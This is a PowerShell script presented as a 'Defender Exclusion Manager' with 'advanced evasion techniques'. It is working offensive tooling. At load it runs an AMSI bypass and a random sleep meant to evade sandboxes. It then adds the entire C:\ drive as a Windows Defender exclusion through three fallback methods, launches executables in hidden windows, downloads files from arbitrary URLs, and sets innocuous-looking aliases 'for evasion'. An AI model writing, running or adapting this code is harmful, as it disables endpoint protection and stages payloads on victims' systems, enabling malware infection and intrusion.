<#
.SYNOPSIS
   Defender Exclusion Manager - Professional Edition
.DESCRIPTION
   Tool for managing Windows Defender exclusions with advanced evasion techniques
   Version: 2.1
   Author: [Your GitHub Handle]
#>

#region Initial Setup
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# AMSI Bypass (Stealth Mode)
$AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$AMSI.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Random delay to evade sandbox detection
Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 3000)
#endregion

function Invoke-DefenderControl {
    [CmdletBinding(DefaultParameterSetName='Default')]
    param(
        [Parameter(ParameterSetName='Exclusion')]
        [switch]$Add,

        [Parameter(ParameterSetName='Exclusion')]
        [switch]$List,

        [Parameter(ParameterSetName='Action')]
        [string]$Run,

        [Parameter(ParameterSetName='Action')]
        [string]$Url,

        [Parameter(ParameterSetName='Action')]
        [string]$Out,

        [Parameter(ParameterSetName='Config')]
        [switch]$AdminCheck,

        [Parameter(ParameterSetName='Config')]
        [switch]$AVStatus
    )

    #region Core Functions
    function Test-AdminRights {
        try {
            return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
                [Security.Principal.WindowsBuiltInRole]::Administrator)
        } catch { return $false }
    }

    function Add-DefenderExclusion {
        $Techniques = @(
            { Add-MpPreference -ExclusionPath "C:\" -Force },
            {
                $MP = [wmiclass]"root\Microsoft\Windows\Defender:MSFT_MpPreference"
                $MP.AddExclusionPath("C:\")
            },
            {
                $Key = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
                if(!(Test-Path $Key)) { New-Item -Path $Key -Force | Out-Null }
                Set-ItemProperty -Path $Key -Name "C_" -Value 0 -Type DWORD -Force
            }
        )

        foreach ($Tech in $Techniques) {
            try {
                & $Tech
                if($?) { return $true }
            } catch { Write-Verbose "[!] Technique failed: $($_.Exception.Message)" }
        }
        return $false
    }

    function Get-ExclusionList {
        try {
            return (Get-MpPreference).ExclusionPath
        } catch {
            try {
                return (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths").PSObject.Properties |
                    Where-Object { $_.Name -notin @("PSPath","PSParentPath") } | Select-Object Name
            } catch {
                Write-Warning "Failed to retrieve exclusions"
                return $null
            }
        }
    }
    #endregion

    #region Main Execution
    switch ($PSCmdlet.ParameterSetName) {
        'Exclusion' {
            if($Add) {
                if(Add-DefenderExclusion) {
                    Write-Output "[+] Exclusion added successfully"
                } else {
                    Write-Error "[-] Failed to add exclusion"
                }
            }

            if($List) {
                $Exclusions = Get-ExclusionList
                if($Exclusions) { $Exclusions } else { Write-Error "No exclusions found" }
            }
        }

        'Action' {
            if($Run) {
                if(Test-AdminRights) {
                    Start-Process $Run -WindowStyle Hidden -ErrorAction Stop
                    Write-Output "[+] Execution started"
                } else {
                    Write-Warning "[!] Admin rights required for execution"
                }
            }

            if($Url -and $Out) {
                try {
                    (New-Object Net.WebClient).DownloadFile($Url, $Out)
                    Write-Output "[+] Download completed"
                } catch {
                    Write-Error "[-] Download failed: $($_.Exception.Message)"
                }
            }
        }

        'Config' {
            if($AdminCheck) {
                Write-Output "[*] Admin rights: $(if(Test-AdminRights) {'Yes'} else {'No'})"
            }

            if($AVStatus) {
                try {
                    $AV = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct |
                        Select-Object displayName, @{N='Status';E={
                            switch ($_.productState.ToString().Substring(2,2)) {
                                '00' {'Disabled'}
                                '10' {'Enabled'}
                                default {'Unknown'}
                            }
                        }}
                    $AV | Format-Table -AutoSize
                } catch {
                    Write-Error "[-] AV check failed: $($_.Exception.Message)"
                }
            }
        }
    }
    #endregion
}

# Aliases for evasion
Set-Alias -Name DefCtrl -Value Invoke-DefenderControl -Force
Set-Alias -Name SecurityTool -Value Invoke-DefenderControl -Force

<#
EXAMPLE USAGE:
DefCtrl -Add              # Add C:\ exclusion
DefCtrl -List             # List current exclusions
DefCtrl -Run "file.exe"   # Execute file
DefCtrl -Url "http://example.com/file" -Out "C:\file.exe"  # Download file
DefCtrl -AdminCheck       # Check admin rights
DefCtrl -AVStatus         # Show AV status
#>
